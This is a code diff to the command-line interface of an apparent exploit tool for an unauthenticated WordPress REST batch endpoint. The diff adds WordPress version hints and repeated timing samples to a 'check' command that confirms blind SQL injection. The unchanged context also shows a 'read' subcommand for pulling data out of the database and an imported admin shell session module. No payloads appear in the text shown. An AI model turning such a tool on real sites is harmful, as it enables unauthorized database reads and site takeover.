@@ -11,6 +11,7 @@ from . import __version__
 from .client import BatchClient
 from .shell import AdminSession
 from .sqli import BlindSQLi
+from .version import public_version_hints
 
 try:
     import readline  # noqa: F401 - enables line editing/history for the interactive prompt
@@ -62,6 +63,26 @@ def _client(args: argparse.Namespace) -> BatchClient:
     )
 
 
+def _short(text: str, *, limit: int = 96) -> str:
+    if len(text) <= limit:
+        return text
+    return text[: limit - 3] + "..."
+
+
+def _print_version_hints(client: BatchClient) -> None:
+    hints = public_version_hints(client)
+    if not hints:
+        warn("No public WordPress version hints found.")
+        return
+
+    info("Public WordPress version hints:")
+    for hint in hints:
+        status = "affected range" if hint.affected else "not in affected ranges"
+        print(f"    - {hint.version} via {hint.source} ({status}) - {_short(hint.detail)}")
+    if any(hint.affected for hint in hints):
+        warn("A public version hint falls in the affected range; verify internally or confirm with authorization.")
+
+
 # -- commands ---------------------------------------------------------------
 
 
@@ -76,14 +97,23 @@ def cmd_check(args: argparse.Namespace) -> int:
     probe = client.probe()
     if probe.status != 207:
         bad(f"Batch endpoint returned HTTP {probe.status} (not 207) — patched or REST API disabled.")
+        _print_version_hints(client)
         return 1
     good("Batch endpoint reachable and unauthenticated (HTTP 207).")
 
-    confirmed, baseline, delayed = BlindSQLi(client, sleep=args.sleep).confirm()
-    if confirmed:
-        good(f"VULNERABLE — baseline {baseline:.2f}s, injected {delayed:.2f}s.")
+    result = BlindSQLi(client, sleep=args.sleep).confirm_timing(samples=args.samples)
+    if args.samples > 1:
+        details = ", ".join(
+            f"{base:.2f}s->{delay:.2f}s" for base, delay in result.samples
+        )
+        info(f"Timing samples: {details}")
+        info(f"Median delta {result.delta:.2f}s; threshold {result.threshold:.2f}s.")
+    if result.confirmed:
+        good(f"VULNERABLE — baseline {result.baseline:.2f}s, injected {result.delayed:.2f}s.")
+        _print_version_hints(client)
         return 0
-    bad(f"Not vulnerable — baseline {baseline:.2f}s, injected {delayed:.2f}s.")
+    bad(f"Not vulnerable — baseline {result.baseline:.2f}s, injected {result.delayed:.2f}s.")
+    _print_version_hints(client)
     return 2
 
 
@@ -224,6 +254,12 @@ def build_parser() -> argparse.ArgumentParser:
     check = sub.add_parser("check", help="safely confirm the vulnerability (non-destructive)")
     _add_common(check)
     check.add_argument("--sleep", type=float, default=3.0, help="confirmation delay (default: 3)")
+    check.add_argument(
+        "--samples",
+        type=int,
+        default=3,
+        help="baseline/delayed timing pairs for confirmation (default: 3)",
+    )
     check.set_defaults(func=cmd_check)
 
     read = sub.add_parser("read", help="read from the database via blind SQL injection")
